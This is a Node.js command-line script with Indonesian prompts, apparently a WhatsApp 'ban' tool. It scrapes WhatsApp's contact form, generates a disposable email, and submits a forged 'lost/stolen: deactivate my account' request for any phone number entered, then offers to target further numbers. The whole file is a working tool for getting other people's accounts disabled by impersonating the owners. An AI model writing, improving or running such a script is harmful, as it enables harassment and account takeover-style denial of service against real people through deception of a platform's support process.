const axios = require('axios').default
const cheerio = require('cheerio')
const util = require('node:util')
const readline = require('node:readline')
const rdline = readline.createInterface({input: process.stdin,output: process.stdout});

const key = 'pdi'

const login = () => {
return new Promise((resolve) => {
rdline.question("Access Token:", token => {
if (token == key) {
menu()
} else {
setTimeout (() => {resolve(login());},2000);}});});};

const menu = () => {
return new Promise((resolve) => {
rdline.question("Menu:\n1.Start\n2.Exit\nAnswer:", menua => {
if (menua == 1) {
start();
} else if (menua == 2){ 
rdline.close();
} else {
setTimeout (() => {resolve(menu());},2000);}});});};

const start = () => {
return new Promise((resolve) => {
rdline.question("Masukan Nomor:", async (nomor) => {
var nom = nomor
if (!nom.startsWith("+")) nom = "+"+nomor
var finding = await (await require ("awesome-phonenumber")(nom)).g
var ntah = await axios.get("https://www.whatsapp.com/contact/noclient/")
var email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
var cookie = ntah.headers["set-cookie"].join("; ")
var $ = cheerio.load(ntah.data)
var $form = $("form");
var url = new URL($form.attr("action"), "https://www.whatsapp.com").href
var form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", finding.regionCode)
form.append("phone_number", finding.number.international)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
var res = await axios({url,method: "POST",data: form,headers: {cookie}})
if (res.data.includes("true")) {
console.log(`Success re-verify ${nom}\n\nResults: Data ${util.format(JSON.parse(res.data.replace("for (;;);", "")))}\n\nParams: ${util.format(form)}`.replace("Perdido/roubado: desative minha conta", "MESSAGE CENSORED !!").replace(email.data[0], "EMAIL CENSORED !!").replace(email.data[0], "EMAIL CENSORED !!"))
rdline.question("Option:\n1.Coba Ke Nomor Lain\n2.Kembali Ke Menu\n3.Exit System\nAnswer:", async (starta) => {
if (starta == 1) {
start()
} else if (starta== 2){ 
menu()
} else if (starta == 3){ 
rdline.close();
} else {
setTimeout (() => {resolve(start());},2000);}})
} else {
console.log("Gagal re-verify!!\nResults: nomor salah/tidak terdaftar di whatsapp")
console.log("Memulai ulang...")
setTimeout (() => {start();}, 2000);}});});};

const banwa = async () => {
login();}
banwa();

/*
Author: Decode-Denpa (Denis)
Fix By: Ivanzz` (ivanz.xyz)
*/;